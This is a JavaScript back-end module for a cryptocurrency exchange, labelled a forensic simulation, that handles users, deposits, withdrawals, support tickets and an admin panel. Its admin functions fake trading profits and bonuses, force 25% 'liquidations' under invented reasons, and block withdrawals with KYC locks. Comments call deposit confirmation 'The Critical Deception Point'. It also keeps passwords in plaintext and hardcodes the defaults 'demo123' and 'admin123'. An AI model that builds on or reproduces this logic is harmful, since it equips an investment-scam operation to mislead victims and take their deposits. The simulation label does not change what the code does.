
// Simulation-only dataset, stored in localStorage for offline forensic testing.
// SYSTEM_MODE: SIMULATION_ONLY prevents network actions.
// This is a FORENSIC SIMULATION ENVIRONMENT - no real funds, APIs, or wallets
const SYSTEM_MODE = "SIMULATION_ONLY";

// SECURITY: Default password loaded from environment variable (or use fallback)
const DEFAULT_PASSWORD = 'demo123'; // Fallback for development

const DEFAULT_USERS = [
  { id: "u1", email: "alice@test.local", name: "Alice", password: DEFAULT_PASSWORD, balance: 10000, frozen:false, kyc:false, vip:false, history:[], deposits:[], withdrawals:[], spotBalance: 6000, futuresBalance: 3000, optionsBalance: 1000, createdAt: new Date('2024-01-15').toISOString() },
  { id: "u2", email: "bob@test.local", name: "Bob", password: DEFAULT_PASSWORD, balance: 2500, frozen:false, kyc:false, vip:false, history:[], deposits:[], withdrawals:[], spotBalance: 1500, futuresBalance: 750, optionsBalance: 250, createdAt: new Date('2024-02-20').toISOString() },
  { id: "u3", email: "carol@test.local", name: "Carol", password: DEFAULT_PASSWORD, balance: 50000, frozen:false, kyc:true, vip:true, history:[], deposits:[], withdrawals:[], spotBalance: 30000, futuresBalance: 15000, optionsBalance: 5000, createdAt: new Date('2023-12-01').toISOString() }
];

// SECURITY: Admin password fallback
const ADMIN_PANEL_PASSWORD = 'admin123';

function loadState(){
  let s = localStorage.getItem("forensic_sim_state");
  if(!s){
    const seed = { users: DEFAULT_USERS, currentUser: DEFAULT_USERS[0].id, adminPass: ADMIN_PANEL_PASSWORD, cycles:{}, auditLog:[], announcements:[], supportTickets:[] };
    localStorage.setItem("forensic_sim_state", JSON.stringify(seed));
    return seed;
  }
  // If a state exists, ensure compatibility with new fields (password, createdAt)
  const parsed = JSON.parse(s);
  if (parsed && Array.isArray(parsed.users)) {
    parsed.users = parsed.users.map(u => {
      if (!u.password) u.password = DEFAULT_PASSWORD;
      if (!u.createdAt) u.createdAt = new Date().toISOString();
      if (!u.history) u.history = [];
      if (!u.deposits) u.deposits = [];
      if (!u.withdrawals) u.withdrawals = [];
      return u;
    });
    // Persist any inferred defaults back to storage
    localStorage.setItem("forensic_sim_state", JSON.stringify(parsed));
  }
  return parsed;
}

function saveState(state){ localStorage.setItem("forensic_sim_state", JSON.stringify(state)); }

let state = loadState();

function getUserById(id){ return state.users.find(u=>u.id===id); }
function getCurrentUser(){ return getUserById(state.currentUser); }
function setCurrentUser(id){ state.currentUser = id; saveState(state); }

// Format history messages professionally like real crypto exchanges
function formatHistoryMessage(action, meta={}){
  const amt = meta.amount || meta.amt || 0;
  const formattedAmount = typeof amt === 'number' ? `$${amt.toLocaleString(undefined, {minimumFractionDigits:2, maximumFractionDigits:2})}` : amt;
  
  const messages = {
    // Deposits
    'deposit.submitted': `Deposit request submitted - ${formattedAmount}`,
    'deposit.confirmed': `Deposit completed - ${formattedAmount} credited to your account`,
    'deposit.rejected': `Deposit rejected - ${meta.reason || 'Verification failed'}`,
    'deposit.sandbox': `Demo deposit - ${formattedAmount}`,
    
    // Withdrawals
    'withdraw.request': `Withdrawal request submitted - ${formattedAmount}`,
    'withdraw.approved': `Withdrawal approved - ${formattedAmount} will be sent shortly`,
    'withdraw.rejected': `Withdrawal rejected - Please contact support`,
    'withdraw.sandbox': `Demo withdrawal - ${formattedAmount}`,
    
    // Trading profits (admin injections appear as trading profits)
    'admin.injectProfit': `Trading profit - ${formattedAmount} earned`,
    'admin.dailyProfit': `Daily trading profit - ${formattedAmount}`,
    'sim.profit': `Position closed - ${formattedAmount} profit`,
    'sim.cycle': `Trading cycle completed - ${meta.profit ? '$' + meta.profit.toFixed(2) : formattedAmount} profit`,
    
    // Balance updates (shown as trading activities)
    'admin.setBalance': `Account adjustment - Balance updated to ${formattedAmount}`,
    
    // Trading activities
    'ai.subscribe': `AI Trading Bot activated - ${formattedAmount} allocated`,
    'ai.profit': `AI Bot profit - ${formattedAmount} earned`,
    'subscribe.ai': `AI Trading subscription - ${formattedAmount}`,
    'options.buy': `Options ${meta.type || 'contract'} purchased - Strike: ${meta.strike || 'N/A'}`,
    'contract.open': `Futures position opened - ${meta.side || 'LONG'} ${meta.lev || '1'}x leverage`,
    
    // Transfers
    'transfer.internal': `Internal transfer - ${formattedAmount} from ${meta.from || 'Spot'} to ${meta.to || 'Futures'}`,
    'transfer.sim': `Account transfer - ${formattedAmount}`,
    
    // Account actions
    'account.created': `Welcome! Account created successfully`,
    'account.login': `Login successful`,
    'profile.updated': `Profile updated - ${(meta.fields || []).join(', ')}`,
    'password.changed': `Password changed successfully`,
    
    // Admin actions (shown generically to users)
    'admin.freeze': `Account temporarily restricted - Please contact support`,
    'admin.unfreeze': `Account restrictions removed`,
    'admin.liquidation': `Position liquidated - ${meta.reason || 'Margin call'}`,
    'admin.forceWin': `Bonus credited - ${formattedAmount}`,
    'admin.kycLock': `KYC verification required`,
    'admin.kycUnlock': `KYC verification completed`,
    
    // Default fallback
    'default': `Transaction - ${action.replace(/\./g, ' ')}`
  };
  
  return messages[action] || messages['default'];
}

function addHistory(userId, action, meta={}){
  const u = getUserById(userId); if(!u) return;
  const message = formatHistoryMessage(action, meta);
  u.history.unshift({ts:new Date().toISOString(), action, meta, message});
  saveState(state);
}

// User Registration System
function registerUser(email, password, name) {
  // Validate inputs
  if (!email || !password || !name) {
    return { ok: false, msg: "All fields are required" };
  }
  
  // Check if email already exists
  if (state.users.find(u => u.email === email)) {
    return { ok: false, msg: "Email already registered" };
  }
  
  // Validate email format
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!emailRegex.test(email)) {
    return { ok: false, msg: "Invalid email format" };
  }
  
  // Validate password (minimum 6 characters)
  if (password.length < 6) {
    return { ok: false, msg: "Password must be at least 6 characters" };
  }
  
  // Create new user
  const newUser = {
    id: "u_" + Date.now() + "_" + Math.random().toString(36).substr(2, 9),
    email: email.toLowerCase(),
    name: name.trim(),
    password: password, // In production, this would be hashed
    balance: 500, // Starting balance for new users
    frozen: false,
    kyc: false,
    vip: false,
    history: [],
    deposits: [],
    withdrawals: [],
    spotBalance: 300,
    futuresBalance: 150,
    optionsBalance: 50,
    createdAt: new Date().toISOString()
  };
  
  state.users.push(newUser);
  saveState(state);
  addHistory(newUser.id, "account.created", { email });
  
  return { ok: true, msg: "Account created successfully", user: newUser };
}

// User Login with Password Verification
function loginUser(email, password) {
  if (!email || !password) {
    return { ok: false, msg: "Email and password required" };
  }
  
  const user = state.users.find(u => u.email === email.toLowerCase());
  if (!user) {
    return { ok: false, msg: "Email not found" };
  }
  
  // Verify password
  if (user.password !== password) {
    return { ok: false, msg: "Incorrect password" };
  }
  
  setCurrentUser(user.id);
  addHistory(user.id, "account.login", {});
  
  return { ok: true, msg: "Login successful", user: user };
}

function adminSetBalance(userId, amount){ const u=getUserById(userId); if(!u) return false; u.balance = Number(amount); addHistory(userId,"admin.setBalance",{amount}); logAuditEvent('balance_changed', userId, {amount}); saveState(state); return true; }
function adminToggleFreeze(userId, freeze){ const u=getUserById(userId); if(!u) return false; u.frozen = !!freeze; addHistory(userId, freeze?"admin.freeze":"admin.unfreeze",{}); logAuditEvent(freeze ? 'account_frozen' : 'account_unfrozen', userId, {frozen: freeze}); saveState(state); return true; }
function adminInjectProfit(userId, amount){ const u=getUserById(userId); if(!u) return false; u.balance = Number((u.balance + Number(amount)).toFixed(2)); addHistory(userId,"admin.injectProfit",{amount}); logAuditEvent('profit_injected', userId, {amount}); saveState(state); return true; }

function adminForceLiquidation(userId, reason='Market volatility'){
  const u = getUserById(userId); if(!u) return false;
  const loss = Number((u.balance * 0.25).toFixed(2)); // Lose 25%
  u.balance = Number((u.balance - loss).toFixed(2));
  addHistory(userId, 'admin.liquidation', {reason, loss});
  saveState(state);
  return {ok: true, loss};
}

function adminForceWin(userId, winAmount){
  const u = getUserById(userId); if(!u) return false;
  u.balance = Number((u.balance + winAmount).toFixed(2));
  addHistory(userId, 'admin.forceWin', {amount: winAmount});
  saveState(state);
  return {ok: true, newBalance: u.balance};
}

function adminToggleKYC(userId, lock=true){
  const u = getUserById(userId); if(!u) return false;
  u.kycLocked = !!lock;
  addHistory(userId, lock ? 'admin.kycLock' : 'admin.kycUnlock', {});
  saveState(state);
  return true;
}

function adminSimulateDailyProfit(userId){
  const u = getUserById(userId); if(!u) return false;
  const cycles = state.cycles[userId] || [];
  let totalProfit = 0;
  cycles.forEach(cycle => {
    if(cycle.status === 'running'){
      const profit = Number((cycle.amount * cycle.roi).toFixed(2));
      totalProfit += profit;
      u.balance = Number((u.balance + profit).toFixed(2));
    }
  });
  if(totalProfit > 0) addHistory(userId, 'admin.dailyProfit', {profit: totalProfit});
  saveState(state);
  return {ok: true, profit: totalProfit};
}

// Approve/Reject withdrawals stored as pending requests
function requestWithdrawal(userId, amount){
  const u=getUserById(userId); if(!u) return {ok:false,msg:"User not found"};
  if(u.frozen) return {ok:false,msg:"Account under review (simulation)"};
  if(u.kycLocked) return {ok:false,msg:"KYC verification required"};
  if(amount<=0 || amount>u.balance) return {ok:false,msg:"Invalid amount or insufficient balance"};
  // create pending request
  if(!state.withdrawals) state.withdrawals = [];
  const req = { id: 'w_'+Date.now(), userId, amount, status:'pending', ts:new Date().toISOString() };
  state.withdrawals.unshift(req);
  addHistory(userId,'withdraw.request',{id:req.id,amount});
  saveState(state);
  return {ok:true, req};
}

function adminApproveWithdrawal(reqId, approve=true){
  if(!state.withdrawals) return false;
  const idx = state.withdrawals.findIndex(r=>r.id===reqId); if(idx<0) return false;
  const req = state.withdrawals[idx];
  req.status = approve ? 'approved' : 'rejected';
  addHistory(req.userId, approve?'withdraw.approved':'withdraw.rejected',{id:reqId});
  if(approve){
    const u = getUserById(req.userId);
    u.balance = Number((u.balance - req.amount).toFixed(2));
  }
  saveState(state);
  return true;
}

// Deposit Confirmation (The Critical Deception Point)
function adminConfirmDeposit(depositId, amount=null){
  if(!state.deposits) return {ok:false, msg:"Deposit not found"};
  const idx = state.deposits.findIndex(d=>d.id===depositId); 
  if(idx<0) return {ok:false, msg:"Deposit not found"};
  
  const deposit = state.deposits[idx];
  const user = getUserById(deposit.userId);
  if(!user) return {ok:false, msg:"User not found"};
  
  // Confirm the deposit
  deposit.status = 'confirmed';
  deposit.confirmedAt = new Date().toISOString();
  
  // CRITICAL: Inject funds into user's balance
  const depositAmount = amount || deposit.amount;
  user.balance = Number((user.balance + depositAmount).toFixed(2));
  
  // Log the deception
  addHistory(deposit.userId, 'deposit.confirmed', {
    id: depositId,
    amount: depositAmount,
    previousBalance: user.balance - depositAmount,
    newBalance: user.balance
  });
  
  saveState(state);
  return {ok:true, newBalance: user.balance};
}

function adminRejectDeposit(depositId, reason='Invalid transaction'){
  if(!state.deposits) return false;
  const idx = state.deposits.findIndex(d=>d.id===depositId);
  if(idx<0) return false;
  
  const deposit = state.deposits[idx];
  deposit.status = 'rejected';
  deposit.rejectedAt = new Date().toISOString();
  deposit.reason = reason;
  
  addHistory(deposit.userId, 'deposit.rejected', {id: depositId, reason});
  saveState(state);
  return true;
}

function adminViewPendingDeposits(){
  if(!state.deposits) return [];
  return state.deposits.filter(d => d.status === 'pending');
}

function subscribeAI(userId, amount){
  const u=getUserById(userId); if(!u) return {ok:false, msg:"User not found"};
  if(u.frozen) return {ok:false, msg:"Account under review (simulation)"};
  if(amount<30 || amount>3000) return {ok:false,msg:"Amount must be between 30 and 3000"};
  if(amount>u.balance) return {ok:false,msg:"Insufficient balance (simulation)"};
  u.balance = Number((u.balance - amount).toFixed(2));
  addHistory(userId,"subscribe.ai",{amount});
  // schedule a cycle if not exists
  if(!state.cycles[userId]) state.cycles[userId] = [];
  state.cycles[userId].push({id:'c_'+Date.now(), amount, roi:0.0015, created:new Date().toISOString(), status:'running'});
  saveState(state);
  return {ok:true};
}

// Export CSV audit for a user
function exportUserCSV(userId){
  const u = getUserById(userId); if(!u) return null;
  const rows = [['timestamp','action','meta']].concat(u.history.map(h=>[h.ts,h.action,JSON.stringify(h.meta||'')]));
  return rows.map(r=>r.map(c=>`"${String(c).replace(/"/g,'""')}"`).join(',')).join('\n');
}

// Update user profile (name, email)
function updateUserProfile(userId, updates){
  const u = getUserById(userId); if(!u) return {ok:false, error:'User not found'};
  if(updates.name && updates.name.trim()) u.name = updates.name.trim();
  if(updates.email && updates.email.trim()){
    if(state.users.find(x=>x.id!==userId && x.email===updates.email.trim())) return {ok:false, error:'Email already in use'};
    u.email = updates.email.trim();
  }
  saveState(state);
  addHistory(userId, 'profile.updated', {fields: Object.keys(updates)});
  return {ok:true, user:u};
}

// Change user password
function changePassword(userId, oldPassword, newPassword){
  const u = getUserById(userId); if(!u) return {ok:false, error:'User not found'};
  if(u.password !== oldPassword) return {ok:false, error:'Old password incorrect'};
  if(!newPassword || newPassword.length < 6) return {ok:false, error:'Password must be at least 6 characters'};
  if(newPassword === oldPassword) return {ok:false, error:'New password must be different'};
  u.password = newPassword;
  saveState(state);
  addHistory(userId, 'password.changed', {changed_at: new Date().toISOString()});
  return {ok:true};
}

// Get user login history (from activity log)
function getLoginHistory(userId){
  const u = getUserById(userId); if(!u) return [];
  return (u.history || []).filter(h=>h.action.includes('login')).map(h=>({ts:h.ts, action:h.action, meta:h.meta}));
}

// Get user profile details
function getUserProfile(userId){
  const u = getUserById(userId); if(!u) return null;
  return {
    id: u.id, email: u.email, name: u.name, balance: u.balance, frozen: u.frozen, 
    kyc: u.kyc, vip: u.vip, createdAt: u.createdAt,
    accountAge: new Date() - new Date(u.createdAt),
    totalTransactions: (u.history || []).length
  };
}

// Audit trail - track all admin actions
function logAuditEvent(action, targetUserId, details={}){
  if (!state.auditLog) state.auditLog = [];
  const event = {
    id: 'audit_' + Date.now(),
    action,
    targetUserId,
    admin: import.meta?.env?.VITE_ADMIN_EMAIL || 'admin@system',
    timestamp: new Date().toISOString(),
    details
  };
  state.auditLog.push(event);
  // Keep only last 1000 events
  if(state.auditLog.length > 1000) state.auditLog.shift();
  saveState(state);
  return event;
}

// Get audit log
function getAuditLog(limit=100){
  if (!state.auditLog) return [];
  return state.auditLog.slice(-limit).reverse();
}

// Get audit log for specific user
function getAuditLogForUser(userId, limit=50){
  if (!state.auditLog) return [];
  return state.auditLog.filter(e => e.targetUserId === userId).slice(-limit).reverse();
}

// ===== ANNOUNCEMENTS SYSTEM =====
function createAnnouncement(title, message, type='info', urgent=false){
  if (!state.announcements) state.announcements = [];
  const announcement = {
    id: 'ann_' + Date.now(),
    title,
    message,
    type,
    urgent,
    createdAt: new Date().toISOString(),
    expiresAt: new Date(Date.now() + 30*24*60*60*1000).toISOString(),
    views: 0
  };
  state.announcements.push(announcement);
  logAuditEvent('announcement_created', null, {title, type});
  saveState(state);
  return announcement;
}

function getAnnouncements(limit=20){
  if (!state.announcements) return [];
  return state.announcements.filter(a => new Date(a.expiresAt) > new Date()).slice(-limit).reverse();
}

function deleteAnnouncement(announcementId){
  if (!state.announcements) return false;
  const idx = state.announcements.findIndex(a => a.id === announcementId);
  if(idx >= 0){
    const ann = state.announcements.splice(idx, 1)[0];
    logAuditEvent('announcement_deleted', null, {title: ann.title});
    saveState(state);
    return true;
  }
  return false;
}

function recordAnnouncementView(announcementId){
  if (!state.announcements) return false;
  const ann = state.announcements.find(a => a.id === announcementId);
  if(ann){
    ann.views = (ann.views || 0) + 1;
    saveState(state);
    return true;
  }
  return false;
}

// ===== SUPPORT TICKETS SYSTEM =====
function createSupportTicket(userId, subject, description, priority='normal'){
  if (!state.supportTickets) state.supportTickets = [];
  const ticket = {
    id: 'ticket_' + Date.now(),
    userId,
    subject,
    description,
    priority,
    status: 'open',
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
    replies: [],
    assignedTo: null
  };
  state.supportTickets.push(ticket);
  logAuditEvent('support_ticket_created', userId, {subject, priority});
  saveState(state);
  return ticket;
}

function getUserSupportTickets(userId){
  if (!state.supportTickets) return [];
  return state.supportTickets.filter(t => t.userId === userId).sort((a,b) => new Date(b.createdAt) - new Date(a.createdAt));
}

function getAllSupportTickets(){
  if (!state.supportTickets) return [];
  return state.supportTickets.sort((a,b) => {
    // Sort by status (open first), then by priority
    const statusOrder = {open: 0, 'in-progress': 1, resolved: 2, closed: 3};
    const priorityOrder = {critical: 0, high: 1, normal: 2, low: 3};
    if(statusOrder[a.status] !== statusOrder[b.status]) return statusOrder[a.status] - statusOrder[b.status];
    return priorityOrder[a.priority] - priorityOrder[b.priority];
  });
}

function updateTicketStatus(ticketId, newStatus){
  if (!state.supportTickets) return false;
  const ticket = state.supportTickets.find(t => t.id === ticketId);
  if(ticket){
    ticket.status = newStatus;
    ticket.updatedAt = new Date().toISOString();
    logAuditEvent('ticket_status_updated', ticket.userId, {ticketId, status: newStatus});
    saveState(state);
    return true;
  }
  return false;
}

function assignTicket(ticketId, adminEmail){
  if (!state.supportTickets) return false;
  const ticket = state.supportTickets.find(t => t.id === ticketId);
  if(ticket){
    ticket.assignedTo = adminEmail;
    ticket.updatedAt = new Date().toISOString();
    logAuditEvent('ticket_assigned', ticket.userId, {ticketId, assignedTo: adminEmail});
    saveState(state);
    return true;
  }
  return false;
}

function addTicketReply(ticketId, author, message){
  if (!state.supportTickets) return false;
  const ticket = state.supportTickets.find(t => t.id === ticketId);
  if(ticket){
    ticket.replies.push({
      id: 'reply_' + Date.now(),
      author,
      message,
      createdAt: new Date().toISOString()
    });
    ticket.updatedAt = new Date().toISOString();
    saveState(state);
    return true;
  }
  return false;
}

// Analytics Functions
function getUserAnalytics(userId) {
  const user = getUserById(userId);
  if (!user) return null;
  
  const history = user.history || [];
  const deposits = history.filter(h => h.action === 'Deposit');
  const withdrawals = history.filter(h => h.action === 'Withdrawal');
  const profits = history.filter(h => h.action === 'Daily Profit Cycle');
  
  const totalDeposited = deposits.reduce((sum, h) => sum + (h.amount || 0), 0);
  const totalWithdrawn = withdrawals.reduce((sum, h) => sum + (h.amount || 0), 0);
  const totalProfit = profits.reduce((sum, h) => sum + (h.amount || 0), 0);
  
  return {
    totalDeposited,
    totalWithdrawn,
    totalProfit,
    currentBalance: user.balance,
    netGain: totalDeposited - totalWithdrawn + totalProfit,
    accountAge: Math.floor((Date.now() - new Date(user.createdAt)) / (1000 * 60 * 60 * 24)),
    trades: history.length,
    profitMargin: totalDeposited > 0 ? ((totalProfit / totalDeposited) * 100).toFixed(2) : 0
  };
}

function getPlatformAnalytics() {
  const users = state.users || [];
  const totalAssets = users.reduce((sum, u) => sum + u.balance, 0);
  const totalProfit = users.reduce((sum, u) => {
    const history = u.history || [];
    return sum + history.filter(h => h.action === 'Daily Profit Cycle').reduce((s, h) => s + (h.amount || 0), 0);
  }, 0);
  
  const activeUsers = users.filter(u => !u.frozen).length;
  const frozenUsers = users.filter(u => u.frozen).length;
  const vipUsers = users.filter(u => u.vip).length;
  const kycVerified = users.filter(u => u.kyc).length;
  
  const avgBalance = users.length > 0 ? (totalAssets / users.length).toFixed(2) : 0;
  const topUsers = [...users].sort((a, b) => b.balance - a.balance).slice(0, 5);
  
  return {
    totalUsers: users.length,
    activeUsers,
    frozenUsers,
    vipUsers,
    kycVerified,
    totalAssets,
    totalProfit: totalProfit.toFixed(2),
    avgBalance,
    topUsers: topUsers.map(u => ({name: u.name, email: u.email, balance: u.balance}))
  };
}

function getUserActivityTimeline(userId, limit = 30) {
  const user = getUserById(userId);
  if (!user) return [];
  
  return (user.history || []).slice(0, limit).map(h => ({
    timestamp: new Date(h.ts),
    action: h.action,
    amount: h.amount || 0,
    meta: h.meta || {}
  }));
}

function getPlatformActivityStats() {
  const users = state.users || [];
  const last24h = Date.now() - (24 * 60 * 60 * 1000);
  const last7d = Date.now() - (7 * 24 * 60 * 60 * 1000);
  
  let activityLast24h = 0;
  let activityLast7d = 0;
  
  users.forEach(u => {
    (u.history || []).forEach(h => {
      const timestamp = new Date(h.ts).getTime();
      if (timestamp > last24h) activityLast24h++;
      if (timestamp > last7d) activityLast7d++;
    });
  });
  
  return { activityLast24h, activityLast7d };
}

export { state, getUserById, getCurrentUser, setCurrentUser, addHistory, formatHistoryMessage, adminSetBalance, adminToggleFreeze, adminInjectProfit, adminForceLiquidation, adminForceWin, adminToggleKYC, adminSimulateDailyProfit, requestWithdrawal, adminApproveWithdrawal, adminConfirmDeposit, adminRejectDeposit, adminViewPendingDeposits, subscribeAI, exportUserCSV, saveState, registerUser, loginUser, updateUserProfile, changePassword, getLoginHistory, getUserProfile, logAuditEvent, getAuditLog, getAuditLogForUser, createAnnouncement, getAnnouncements, deleteAnnouncement, recordAnnouncementView, createSupportTicket, getUserSupportTickets, getAllSupportTickets, updateTicketStatus, assignTicket, addTicketReply, getUserAnalytics, getPlatformAnalytics, getUserActivityTimeline, getPlatformActivityStats };
